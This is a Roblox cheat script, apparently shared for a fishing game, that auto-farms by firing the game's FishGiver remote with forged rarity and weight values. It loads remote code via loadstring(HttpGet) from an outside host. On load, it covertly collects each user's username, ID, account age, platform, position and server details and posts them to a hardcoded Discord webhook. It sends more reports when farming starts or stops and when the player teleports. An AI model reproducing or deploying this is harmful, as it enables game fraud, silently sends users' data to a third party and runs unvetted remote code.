-- Auto Fish Farm dengan Rayfield UI Library
-- Created for Roblox fishing game

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local MarketPlaceService = game:GetService("MarketplaceService")

local Player = Players.LocalPlayer
local Mouse = Player:GetMouse()

-- Webhook Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1473696833787396259/n-KzBG5KWgJWnlSNtu0staq797igm0zpK9-jXeh3XY4K0CgSu9Jlcx1oJ_iMC0BdHjTr" -- Ganti dengan URL webhook Discord kamu
local scriptVersion = "1.0.0"
local scriptName = "AmbonXLonely Auto Fish Farm"

-- Load Rayfield Library
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- Function to send data to Discord webhook
function sendToWebhook(data)
    if WEBHOOK_URL == "" then
        warn("Webhook URL not configured!")
        return
    end
    
    local success, response = pcall(function()
        local requestData = {
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        }
        
        local response = request(requestData)
        return response
    end)
    
    if not success then
        warn("Failed to send webhook: " .. tostring(response))
    end
end

-- Function to collect user information
function collectUserInfo()
    local accountAge = Player.AccountAge
    local userId = Player.UserId
    local userName = Player.Name
    local displayName = Player.DisplayName
    local membershipType = Player.MembershipType
    
    -- Get join date
    local joinDate = "Unknown"
    local success, info = pcall(function()
        return Players:GetUserThumbnailAsync(userId)
    end)
    
    -- Get place info
    local placeId = game.PlaceId
    local placeName = "Unknown"
    local success2, placeInfo = pcall(function()
        return MarketPlaceService:GetProductInfo(placeId)
    end)
    
    if success2 then
        placeName = placeInfo.Name
    end
    
    -- Get game info
    local gameId = game.GameId
    local jobId = game.JobId
    
    -- Get hardware info
    local platform = UserInputService:GetPlatform()
    local platformName = "Unknown"
    
    if platform == Enum.Platform.Windows then
        platformName = "Windows"
    elseif platform == Enum.Platform.OSX then
        platformName = "macOS"
    elseif platform == Enum.Platform.IOS then
        platformName = "iOS"
    elseif platform == Enum.Platform.Android then
        platformName = "Android"
    elseif platform == Enum.Platform.XBoxOne then
        platformName = "Xbox"
    elseif platform == Enum.Platform.PS4 then
        platformName = "PlayStation"
    elseif platform == Enum.Platform.PS5 then
        platformName = "PlayStation 5"
    elseif platform == Enum.Platform.XBoxSeries then
        platformName = "Xbox Series"
    end
    
    -- Get network info
    local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
    local fps = math.floor(1 / game:GetService("RunService").RenderStepped:Wait())
    
    -- Get character position
    local position = "Unknown"
    local character = Player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local pos = character.HumanoidRootPart.Position
        position = string.format("(%.1f, %.1f, %.1f)", pos.X, pos.Y, pos.Z)
    end
    
    -- Get local time
    local localTime = os.date("%Y-%m-%d %H:%M:%S")
    
    return {
        AccountAge = accountAge,
        UserId = userId,
        Username = userName,
        DisplayName = displayName,
        MembershipType = tostring(membershipType),
        PlaceId = placeId,
        PlaceName = placeName,
        GameId = gameId,
        JobId = jobId,
        Platform = platformName,
        Ping = ping,
        FPS = fps,
        Position = position,
        LocalTime = localTime,
        ScriptVersion = scriptVersion,
        ScriptName = scriptName
    }
end

-- Function to format user info for webhook
function formatWebhookMessage(userInfo)
    local embed = {
        {
            ["title"] = "🔔 New User Detected - " .. scriptName,
            ["description"] = "User information has been collected",
            ["color"] = 16711680, -- Red color
            ["fields"] = {
                {
                    ["name"] = "👤 User Information",
                    ["value"] = string.format("**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**Account Age:** %d days\n**Membership:** %s",
                        userInfo.Username,
                        userInfo.DisplayName,
                        userInfo.UserId,
                        userInfo.AccountAge,
                        userInfo.MembershipType
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "🎮 Game Information",
                    ["value"] = string.format("**Place:** %s\n**Place ID:** %d\n**Game ID:** %d\n**Job ID:** %s",
                        userInfo.PlaceName,
                        userInfo.PlaceId,
                        userInfo.GameId,
                        userInfo.JobId
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "💻 System Information",
                    ["value"] = string.format("**Platform:** %s\n**Ping:** %s\n**FPS:** %d\n**Position:** %s",
                        userInfo.Platform,
                        userInfo.Ping,
                        userInfo.FPS,
                        userInfo.Position
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "📊 Script Information",
                    ["value"] = string.format("**Script:** %s\n**Version:** %s\n**Time:** %s",
                        scriptName,
                        userInfo.ScriptVersion,
                        userInfo.LocalTime
                    ),
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "Auto Fish Farm | User Data Logger",
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
    
    return {
        ["content"] = "@everyone New user detected!",
        ["embeds"] = embed,
        ["username"] = "AmbonXLonely Logger",
        ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userInfo.UserId .. "&width=420&height=420&format=png"
    }
end

-- Send initial webhook when script loads
local userInfo = collectUserInfo()
local webhookData = formatWebhookMessage(userInfo)
sendToWebhook(webhookData)

-- Referensi RemoteEvents
local CastReplication = ReplicatedStorage:WaitForChild("FishingSystem"):WaitForChild("CastReplication")
local CleanupCast = ReplicatedStorage:WaitForChild("FishingSystem"):WaitForChild("CleanupCast")
local FishGiver = ReplicatedStorage:WaitForChild("FishingSystem"):WaitForChild("FishingSystemEvents"):WaitForChild("FishGiver")

-- Daftar Ikan Lengkap (SEMUA IKAN)
local AllFishList = {
    "Ancient Lochness Lava",
    "Ancient Lochness Monster",
    "Bajak Laut Dreadfin", 
    "Bajak Laut Megalodon",
    "Belut Panther",
    "Blackcap Basslet",
    "Blueflame Ray",
    "Boar Fish",
    "Candy Butterfly",
    "Cumi-cumi Penjaga Suci",
    "Cypress Ratua",
    "Domino Damsel",
    "Dory",
    "Dotted Stingray",
    "El Maja",
    "El Maja Merah",
    "Ences Maja",
    "Enchanted Angelfish",
    "Fangtooth",
    "Fossilized Shark",
    "Frostborn Shark",
    "Gadis Lava",
    "Goliath Tiger",
    "Green Gillfish",
    "Gurita Hijau",
    "Guttenfang",
    "Hammerhead Shark",
    "Hiu Magma",
    "Ikan Badut",
    "Ikan Cutlas",
    "Ikan Layar Bajak Laut",
    "Ikan Malaikat",
    "Kapten Ikan Buntal",
    "Kardian Lava",
    "Kelomang",
    "Kepala Ular",
    "Kepiting Biru",
    "Kepiting Harta Karun",
    "Kepiting Pelaut",
    "Kupu-Kupu Lava",
    "Loggerhead Turtle",
    "Lopster Biru",
    "Lopster Merah",
    "Megalodon",
    "Purple Megalodon",
    "Tulang Koi",
    "Tuna Lava",
    "Volsail Tang",
    "Zombie Megalodon",
    "ikan bandit",
    "Ancient Magma Whale",
    "Love Nessie"
}

-- Variables
local isFarming = false
local fishCaught = 0
local totalWeight = 0
local currentPower = 96
local selectedFishName = "Kepiting Biru"
local secretMode = true
local rodName = "Diamond Rod"

-- Power levels untuk dropdown
local powerLevels = {
    [1] = {Name = "50% Power", Value = 50},
    [2] = {Name = "75% Power", Value = 75},
    [3] = {Name = "96% Power", Value = 96},
    [4] = {Name = "100% Power", Value = 100},
}

-- Fishing Functions
function castFishingRod()
    if not isFarming then return end
    
    local character = Player.Character
    if not character then return end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end
    
    local castPosition = humanoidRootPart.Position + humanoidRootPart.CFrame.LookVector * 10
    local lookPosition = castPosition + Vector3.new(0, -10, 0)
    
    local args = {
        castPosition,
        lookPosition,
        rodName,
        currentPower
    }
    
    CastReplication:FireServer(unpack(args))
end

function cleanupCast()
    CleanupCast:FireServer()
end

function giveFish()
    if not isFarming then return end
    
    local character = Player.Character
    if not character then return end
    
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end
    
    local hookPosition = humanoidRootPart.Position + Vector3.new(0, -5, 0)
    
    -- Secret Mode: Semua ikan rarity Secret dan weight 999
    local rarity = secretMode and "Secret" or "Rare"
    local weight = secretMode and 999 or math.random(10, 100) / 10
    
    local args = {
        {
            hookPosition = hookPosition,
            rarity = rarity,
            name = selectedFishName,
            weight = weight
        }
    }
    
    FishGiver:FireServer(unpack(args))
    
    -- Update stats
    fishCaught = fishCaught + 1
    totalWeight = totalWeight + weight
    
    -- Update UI stats
    Rayfield:Notify({
        Title = "Fish Caught!",
        Content = string.format("%s | Weight: %.1f", selectedFishName, weight),
        Duration = 2,
        Image = 4483362458,
    })
end

-- Auto Farm Loop
spawn(function()
    while true do
        if isFarming then
            castFishingRod()
            wait(0.5)
            
            local biteTime = math.random(1, 1.1)
            wait(biteTime)
            
            if isFarming then
                giveFish()
                cleanupCast()
                wait(1)
            end
        else
            wait(0.5)
        end
    end
end)

-- Send webhook when farming starts
local function sendFarmingStartWebhook()
    local userInfo = collectUserInfo()
    local embed = {
        {
            ["title"] = "🎣 Farming Started",
            ["description"] = string.format("**User:** %s\n**Rod:** %s\n**Power:** %d%%\n**Target Fish:** %s\n**Secret Mode:** %s",
                userInfo.Username,
                rodName,
                currentPower,
                selectedFishName,
                secretMode and "Enabled" or "Disabled"
            ),
            ["color"] = 65280, -- Green color
            ["footer"] = {
                ["text"] = "Farming Session Started",
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
    
    local data = {
        ["embeds"] = embed,
        ["username"] = "AmbonXLonely Logger",
        ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userInfo.UserId .. "&width=420&height=420&format=png"
    }
    
    sendToWebhook(data)
end

-- Send webhook when farming stops
local function sendFarmingStopWebhook()
    local userInfo = collectUserInfo()
    local embed = {
        {
            ["title"] = "⏹️ Farming Stopped",
            ["description"] = string.format("**User:** %s\n**Fish Caught:** %d\n**Total Weight:** %.0f\n**Session Stats:**",
                userInfo.Username,
                fishCaught,
                totalWeight
            ),
            ["color"] = 16711680, -- Red color
            ["fields"] = {
                {
                    ["name"] = "📊 Session Statistics",
                    ["value"] = string.format("**Fish Caught:** %d\n**Total Weight:** %.0f\n**Average Weight:** %.1f",
                        fishCaught,
                        totalWeight,
                        fishCaught > 0 and totalWeight / fishCaught or 0
                    ),
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "Farming Session Ended",
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
    
    local data = {
        ["embeds"] = embed,
        ["username"] = "AmbonXLonely Logger",
        ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userInfo.UserId .. "&width=420&height=420&format=png"
    }
    
    sendToWebhook(data)
end

-- Create Rayfield Window
local Window = Rayfield:CreateWindow({
    Name = "AmbonXLonely🚯 - Auto Fish Farm",
    LoadingTitle = "Auto Fish Farm",
    LoadingSubtitle = "by AmbonXLonely",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "AmbonXLonely",
        FileName = "AutoFishFarm"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Key System",
        Subtitle = "Enter Key",
        Note = "Join Discord for key",
        FileName = "AmbonXLonelyKey",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"Hello123"}
    }
})

-- Main Tab
local MainTab = Window:CreateTab("Main", 4483362458)
local MainSection = MainTab:CreateSection("Control Panel")

-- Status Display
local StatusLabel = MainTab:CreateLabel("Status: 🔴 OFF")

-- Toggle Farming
local FarmingToggle = MainTab:CreateToggle({
    Name = "Start/Stop Farming",
    CurrentValue = false,
    Flag = "FarmingToggle",
    Callback = function(Value)
        isFarming = Value
        
        if isFarming then
            StatusLabel:Set("Status: 🟢 FARMING")
            Rayfield:Notify({
                Title = "Auto Fish",
                Content = "Farming started!",
                Duration = 3,
                Image = 4483362458,
            })
            sendFarmingStartWebhook()
        else
            StatusLabel:Set("Status: 🔴 OFF")
            Rayfield:Notify({
                Title = "Auto Fish",
                Content = "Farming stopped!",
                Duration = 3,
                Image = 4483362458,
            })
            sendFarmingStopWebhook()
        end
    end,
})

-- Stats Label
local StatsLabel = MainTab:CreateLabel(string.format("Fish: %d | Weight: %.0f", fishCaught, totalWeight))

-- Rod Input
local RodInput = MainTab:CreateInput({
    Name = "Rod Name",
    CurrentValue = "Diamond Rod",
    PlaceholderText = "Enter rod name",
    RemoveTextAfterFocusLost = false,
    Flag = "RodInput",
    Callback = function(Text)
        rodName = Text
    end,
})

-- Power Dropdown
local PowerDropdown = MainTab:CreateDropdown({
    Name = "Fishing Power",
    Options = {"50% Power", "75% Power", "96% Power", "100% Power"},
    CurrentOption = "96% Power",
    Flag = "PowerDropdown",
    Callback = function(Option)
        for i, power in pairs(powerLevels) do
            if power.Name == Option then
                currentPower = power.Value
                break
            end
        end
    end,
})

-- Secret Mode Toggle
local SecretToggle = MainTab:CreateToggle({
    Name = "Secret Mode (All Fish Legendary)",
    CurrentValue = true,
    Flag = "SecretToggle",
    Callback = function(Value)
        secretMode = Value
        Rayfield:Notify({
            Title = "Secret Mode",
            Content = Value and "Enabled: All fish will be Secret rarity" or "Disabled: Normal fish rarity",
            Duration = 3,
            Image = 4483362458,
        })
    end,
})

-- Fish Selection Tab
local FishTab = Window:CreateTab("Fish Selection", 4483362458)
local FishSection = FishTab:CreateSection("Select Your Target Fish")

-- Selected Fish Display
local SelectedFishLabel = FishTab:CreateLabel("Selected: Kepiting Biru")

-- Create Fish Buttons (Grouped by category)
local function createFishCategory(categoryName, fishList)
    local category = FishTab:CreateSection(categoryName)
    
    for _, fishName in ipairs(fishList) do
        local fishButton = FishTab:CreateButton({
            Name = fishName,
            Callback = function()
                selectedFishName = fishName
                SelectedFishLabel:Set("Selected: " .. fishName)
                Rayfield:Notify({
                    Title = "Fish Selected",
                    Content = fishName,
                    Duration = 2,
                    Image = 4483362458,
                })
            end,
        })
    end
end

-- Group fish by categories
local LegendaryFish = {}
local LavaFish = {}
local PirateFish = {}
local NormalFish = {}

for _, fishName in ipairs(AllFishList) do
    if fishName:find("Megalodon") or fishName:find("Lochness") or fishName:find("Ancient") or fishName:find("Whale") then
        table.insert(LegendaryFish, fishName)
    elseif fishName:find("Lava") or fishName:find("Magma") or fishName:find("Enchanted") or fishName:find("Secret") then
        table.insert(LavaFish, fishName)
    elseif fishName:find("Bajak Laut") or fishName:find("Pirate") or fishName:find("Dreadfin") then
        table.insert(PirateFish, fishName)
    else
        table.insert(NormalFish, fishName)
    end
end

-- Create category buttons
createFishCategory("🔥 LEGENDARY FISH", LegendaryFish)
createFishCategory("🌋 LAVA FISH", LavaFish)
createFishCategory("🏴‍☠️ PIRATE FISH", PirateFish)
createFishCategory("🐟 NORMAL FISH", NormalFish)

-- Stats Tab
local StatsTab = Window:CreateTab("Statistics", 4483362458)
local StatsSection = StatsTab:CreateSection("Fishing Statistics")

-- Stats Labels
local FishCountLabel = StatsTab:CreateLabel("Fish Caught: 0")
local WeightLabel = StatsTab:CreateLabel("Total Weight: 0")
local SessionLabel = StatsTab:CreateLabel("Session Time: 00:00:00")

-- Reset Stats Button
local ResetButton = StatsTab:CreateButton({
    Name = "Reset Statistics",
    Callback = function()
        fishCaught = 0
        totalWeight = 0
        FishCountLabel:Set("Fish Caught: 0")
        WeightLabel:Set("Total Weight: 0")
        Rayfield:Notify({
            Title = "Statistics",
            Content = "Statistics have been reset",
            Duration = 2,
            Image = 4483362458,
        })
    end,
})

-- Settings Tab
local SettingsTab = Window:CreateTab("Settings", 4483362458)
local SettingsSection = SettingsTab:CreateSection("Configuration")

-- Webhook Configuration Section
local WebhookSection = SettingsTab:CreateSection("Webhook Configuration")

-- Webhook URL Input
local WebhookInput = SettingsTab:CreateInput({
    Name = "Webhook URL",
    CurrentValue = WEBHOOK_URL,
    PlaceholderText = "Enter Discord webhook URL",
    RemoveTextAfterFocusLost = false,
    Flag = "WebhookInput",
    Callback = function(Text)
        WEBHOOK_URL = Text
        Rayfield:Notify({
            Title = "Webhook",
            Content = "Webhook URL updated!",
            Duration = 2,
            Image = 4483362458,
        })
    end,
})

-- Test Webhook Button
local TestWebhookButton = SettingsTab:CreateButton({
    Name = "Test Webhook",
    Callback = function()
        local userInfo = collectUserInfo()
        local testEmbed = {
            {
                ["title"] = "✅ Webhook Test",
                ["description"] = string.format("Webhook is working properly!\n\n**User:** %s\n**Platform:** %s\n**Time:** %s",
                    userInfo.Username,
                    userInfo.Platform,
                    userInfo.LocalTime
                ),
                ["color"] = 65280, -- Green color
                ["footer"] = {
                    ["text"] = "Test Message",
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
        
        local data = {
            ["embeds"] = testEmbed,
            ["username"] = "AmbonXLonely Logger",
            ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userInfo.UserId .. "&width=420&height=420&format=png"
        }
        
        sendToWebhook(data)
        Rayfield:Notify({
            Title = "Webhook",
            Content = "Test message sent!",
            Duration = 2,
            Image = 4483362458,
        })
    end,
})

-- Keybind Toggle
local KeybindToggle = SettingsTab:CreateKeybind({
    Name = "Toggle GUI Keybind",
    CurrentKeybind = "F9",
    HoldToInteract = false,
    Flag = "GUIKeybind",
    Callback = function(Keybind)
        Rayfield:Notify({
            Title = "Keybind Changed",
            Content = "GUI toggle key: " .. Keybind,
            Duration = 2,
            Image = 4483362458,
        })
    end,
})

-- Discord Button
local DiscordButton = SettingsTab:CreateButton({
    Name = "Join Discord",
    Callback = function()
        setclipboard("https://discord.gg/ambonxlonly")
        Rayfield:Notify({
            Title = "Discord",
            Content = "Discord link copied to clipboard!",
            Duration = 3,
            Image = 4483362458,
        })
    end,
})

-- Update stats periodically
spawn(function()
    local startTime = tick()
    
    while true do
        wait(1)
        
        if isFarming then
            -- Update stats
            FishCountLabel:Set("Fish Caught: " .. fishCaught)
            WeightLabel:Set("Total Weight: " .. math.floor(totalWeight))
            
            -- Update session time
            local elapsed = tick() - startTime
            local hours = math.floor(elapsed / 3600)
            local minutes = math.floor((elapsed % 3600) / 60)
            local seconds = math.floor(elapsed % 60)
            SessionLabel:Set(string.format("Session Time: %02d:%02d:%02d", hours, minutes, seconds))
        end
    end
end)

-- Send webhook when player leaves
game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
    local userInfo = collectUserInfo()
    local embed = {
        {
            ["title"] = "👋 Player Left",
            ["description"] = string.format("**User:** %s\n**Fish Caught:** %d\n**Total Weight:** %.0f\n**Session Stats:**",
                userInfo.Username,
                fishCaught,
                totalWeight
            ),
            ["color"] = 16711680, -- Red color
            ["fields"] = {
                {
                    ["name"] = "📊 Final Statistics",
                    ["value"] = string.format("**Fish Caught:** %d\n**Total Weight:** %.0f\n**Average Weight:** %.1f",
                        fishCaught,
                        totalWeight,
                        fishCaught > 0 and totalWeight / fishCaught or 0
                    ),
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "Player Disconnected",
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
    
    local data = {
        ["embeds"] = embed,
        ["username"] = "AmbonXLonely Logger",
        ["avatar_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userInfo.UserId .. "&width=420&height=420&format=png"
    }
    
    sendToWebhook(data)
end)

-- Load notification
Rayfield:Notify({
    Title = "Auto Fish Farm",
    Content = "Script loaded successfully!",
    Duration = 5,
    Image = 4483362458,
})

print("🎣 Auto Fish Farm with Rayfield UI Loaded!")
print("📌 Total Fish: " .. #AllFishList)
print("🎯 Legendary Fish: " .. #LegendaryFish)
print("🎯 Lava Fish: " .. #LavaFish)
print("🎯 Pirate Fish: " .. #PirateFish)
print("🎯 Normal Fish: " .. #NormalFish)